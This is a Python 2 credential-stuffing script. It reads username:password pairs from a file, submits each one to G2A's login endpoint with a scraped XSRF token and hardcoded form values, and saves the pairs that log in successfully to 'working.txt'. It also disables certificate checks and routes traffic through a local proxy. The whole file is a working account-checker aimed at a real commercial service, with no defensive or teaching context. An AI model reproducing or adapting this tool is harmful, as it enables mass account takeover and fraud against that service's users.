# -*- coding: utf-8 -*-
import requests
import re
import Queue
import codecs
import os
import time
import base64
import urllib
from threading import Thread

requests.packages.urllib3.disable_warnings()


def check(q):
    while True:
        try:
            c = q.get()
            user = c.split(':')[0]
            passw = c.split(':')[1]
            work = False
            proxy = {
                     'http': '127.0.0.1:8888',
                     'https': '127.0.0.1:8888'
            }
            s = requests.session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
                'Accept-Encoding': 'gzip',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Referer': 'https://id.g2a.com/auth/auth/?client_id=g2a&redirect_uri=https%3A%2F%2Fwww.g2a.com%2Foauth2%2Ftoken&response_type=code'
            }
            r = s.get(
                        'https://id.g2a.com/auth/auth/?client_id=g2a&redirect_uri=https%3A%2F%2Fwww.g2a.com%2Foauth2%2Ftoken&response_type=code',
                        verify=False,
                        headers=headers,
                        proxies=proxy
                    )
            print s.cookies.get_dict()['XSRF-TOKEN']
            data = 'username={0}&password={1}&security=&remember_me=false&secret=&salt=t7SQtstmiBkPljCBO8C4w64M9piUXKoPZwV7dRlvefo%3D&protection=40333b9e126407086026c6a9d45d2a38'.format(user, passw)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['X-Requested-With'] = 'XMLHttpRequest'
            headers['X-XSRF-TOKEN'] = s.cookies.get_dict()['XSRF-TOKEN']
            r = s.post(
                        'https://id.g2a.com/signin?client_id=g2a&redirect_uri=https%3A%2F%2Fwww.g2a.com%2Foauth2%2Ftoken&response_type=code&auth_call=1&auth_json=1',
                        data,
                        verify=False,
                        headers=headers,
                        proxies=proxy
                    )
            
            if 'http_code":301' in r.text:
                work = True
            if work:
                print user, 'works!'
                f = open("working.txt", "a")
                f.write('{0}:{1}\n'.format(user, passw))
                f.close()
            else:
                print user, 'does not work!'
            time.sleep(0.005)
        except Exception, e:
            print e
            raw_input("Please Send Me The Error Message!")
        q.task_done()
    
def main():
    with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
        users = f.readlines()
    queue = Queue.Queue()
    
    for _ in range(int(1)):
        worker = Thread(target=check, args=(queue,))
        worker.start()
    for user in users:
        queue.put(user.strip().encode('ascii', 'ignore'))
            
if __name__ == '__main__':
    main()
        